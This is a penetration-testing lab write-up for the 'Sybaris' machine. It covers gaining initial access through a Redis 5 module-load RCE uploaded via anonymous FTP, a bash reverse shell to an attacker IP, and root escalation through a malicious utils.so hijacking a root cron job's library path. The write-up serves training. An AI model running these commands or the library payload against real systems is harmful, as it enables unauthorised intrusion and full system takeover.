---
icon: ubuntu
---

# Sybaris - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.194.93 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 19:41 EDT
Nmap scan report for 192.168.194.93
Host is up (0.031s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE  SERVICE   VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp       vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.158
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0               6 Apr 01  2020 pub [NSE: writeable]
22/tcp    open   ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 21:94:de:d3:69:64:a8:4d:a8:f0:b5:0a:ea:bd:02:ad (RSA)
|   256 67:42:45:19:8b:f5:f9:a5:a4:cf:fb:87:48:a2:66:d0 (ECDSA)
|_  256 f3:e2:29:a3:41:1e:76:1e:b1:b7:46:dc:0b:b9:91:77 (ED25519)
53/tcp    closed domain
80/tcp    open   http      Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.22
|_http-generator: HTMLy v2.7.5
| http-robots.txt: 11 disallowed entries 
| /config/ /system/ /themes/ /vendor/ /cache/ 
| /changelog.txt /composer.json /composer.lock /composer.phar /search/ 
|_/admin/
|_http-title: Sybaris - Just another HTMLy blog
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
6379/tcp  open   redis     Redis key-value store 5.0.9
10091/tcp closed unknown
10092/tcp closed unknown
10093/tcp closed unknown
10094/tcp closed unknown
10095/tcp closed unknown
10096/tcp closed unknown
10097/tcp closed unknown
10098/tcp closed unknown
10099/tcp closed unknown
10100/tcp closed itap-ddtp
Device type: general purpose|router|WAP|media device
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X (91%), Asus embedded (88%), Amazon embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (94%), Linux 3.13 - 4.4 (93%), Linux 2.6.32 - 3.13 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%), Linux 3.10 (91%), Linux 3.8 - 3.16 (90%), Linux 3.4 - 3.10 (90%), Linux 5.1 - 5.15 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Unix

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   29.68 ms 192.168.45.1
2   29.65 ms 192.168.45.254
3   30.98 ms 192.168.251.1
4   31.38 ms 192.168.194.93
```

### <mark style="color:$primary;">FTP Enumeration</mark>

Ftp has anonymous access enabled, but the directory is empty

<mark style="color:yellow;">**Note that we can place files!**</mark>

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2422).png" alt=""><figcaption></figcaption></figure>

Default credentials did not work. Also response is very discriptive we may be able to use this to brute force some usernames

#### Directory Busting

```
dirsearch -u http://192.168.194.93/
```

<figure><img src="../../.gitbook/assets/image (2423).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2424).png" alt=""><figcaption></figcaption></figure>

We have some possible Usernames.

### <mark style="color:$primary;">REDIS Port 6379</mark>&#x20;

<figure><img src="../../.gitbook/assets/image (2425).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">REDIS RCE 5.X</mark>

For this version i will perform the RCE exploit manually, I am going to grab exp-lin.so from [**here**](https://github.com/jas502n/Redis-RCE)

```
git clone https://github.com/jas502n/Redis-RCE.git
```

I am going to place the module in the ftp share I have access to&#x20;

```
ftp 192.168.194.93
```

<figure><img src="../../.gitbook/assets/image (2426).png" alt=""><figcaption></figcaption></figure>

Now I am going to use the redis-cli to interact and load the module and execute commands

```
redis-cli -h 192.168.194.93
```

```
MODULE LOAD /var/ftp/pub/exp_lin.so
```

```
system.exec "id"
```

<figure><img src="../../.gitbook/assets/image (2427).png" alt=""><figcaption></figcaption></figure>

Now to get a reverse shell

```
system.exec "bash -i >& /dev/tcp/192.168.45.158/80 0>&1"
```

<figure><img src="../../.gitbook/assets/image (2428).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

Found a password for pablo in **`/var/www/html/config/users`**

<figure><img src="../../.gitbook/assets/image (2430).png" alt=""><figcaption></figcaption></figure>

I'll Improve my shell's tty

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

<figure><img src="../../.gitbook/assets/image (2431).png" alt=""><figcaption></figcaption></figure>

No sudo privileges for pablo

<figure><img src="../../.gitbook/assets/image (2432).png" alt=""><figcaption></figcaption></figure>

There's a cronjob running every minute as root. Let's check what it is

<figure><img src="../../.gitbook/assets/image (2433).png" alt=""><figcaption></figcaption></figure>

A missing shared library, utils.so. We might be able to use this to privesc if we have write permissions in the right directory. I'll run linpeas now

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (2434).png" alt=""><figcaption></figcaption></figure>

**`/usr/local/lib/dev`** is writable and it is on the LD\_LIBRARY\_PATH on crontab. I can place a malicious utils.so there

### <mark style="color:$primary;">shared library file hijacking</mark>

Malicious utils.so file that sets SUID bit on /bin/bash

```
//gcc -shared -o utils.so -fPIC utils.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    setuid(0);
    setgid(0);
    printf("I'm the bad library\n");
    system("chmod +s /bin/bash");
}
```

let's check if there is a gcc compiler on the target machine

<figure><img src="../../.gitbook/assets/image (2435).png" alt=""><figcaption></figcaption></figure>

I'll download it to the target machine, compile it and move it to **`/usr/local/lib/dev`**  we're the log-sweeper can find it and execute it

```
wget 192.168.45.158/utils.c
```

```
gcc -shared -o utils.so -fPIC utils.c
```

```
cp utils.so /usr/local/lib/dev
```

```
/usr/bin/log-sweeper
```

<figure><img src="../../.gitbook/assets/image (2436).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2437).png" alt=""><figcaption></figcaption></figure>

it worked now to escalate to root!

<figure><img src="../../.gitbook/assets/image (2438).png" alt=""><figcaption></figcaption></figure>
